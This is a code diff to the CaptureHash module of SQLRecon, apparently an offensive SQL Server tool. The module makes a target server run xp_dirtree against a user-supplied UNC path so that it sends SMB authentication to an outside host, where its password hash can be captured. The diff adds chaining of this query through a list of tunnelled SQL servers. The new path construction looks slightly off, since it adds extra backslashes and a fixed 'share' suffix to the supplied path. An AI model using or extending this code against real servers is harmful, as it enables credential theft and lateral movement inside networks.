@@ -8,18 +8,24 @@ namespace SQLRecon.Modules
 
         /// <summary>
         /// This constructor will instruct the remote SQL server to solicit
-        /// a SMB reqeuest to a supplied UNC path.
+        /// a SMB request to a supplied UNC path.
         /// </summary>
         /// <param name="con">Connection to SQL Server</param>
         /// <param name="smbShare">The user supplied UNC path</param>
-        /// <param name="linkedSQLServer">A Linked SQL Server, if specified</param>
-        public CaptureHash(SqlConnection con, string smbShare, string linkedSQLServer = "null")
+        /// <param name="tunnelSqlServers">A list of SQL Servers forming the tunnel path, if specified</param>
+        public CaptureHash(SqlConnection con, string smbShare, string[] tunnelSqlServers = null)
         {
-
-            _ = (linkedSQLServer.Equals("null")) 
-                ? _sqlQuery.ExecuteCustomQuery(con, "EXEC master..xp_dirtree \"" + smbShare + "\";")
-                : _sqlQuery.ExecuteCustomQuery(con, "select * from openquery(\"" + linkedSQLServer + 
-                "\", 'SELECT 1; EXEC master..xp_dirtree \"" + smbShare + "\";')");
+            if (tunnelSqlServers != null && tunnelSqlServers.Length > 0)
+            {
+                // Construct the query to send the SMB request through the tunnel
+                string query = $"EXEC master..xp_dirtree '\\\\{smbShare}\\share'";
+                string result = _sqlQuery.ExecuteTunnelCustomQuery(con, tunnelSqlServers, query);
+            }
+            else
+            {
+                // Directly send the SMB request
+                _sqlQuery.ExecuteCustomQuery(con, $"EXEC master..xp_dirtree '\\\\{smbShare}\\share';");
+            }
         }
     }
 }
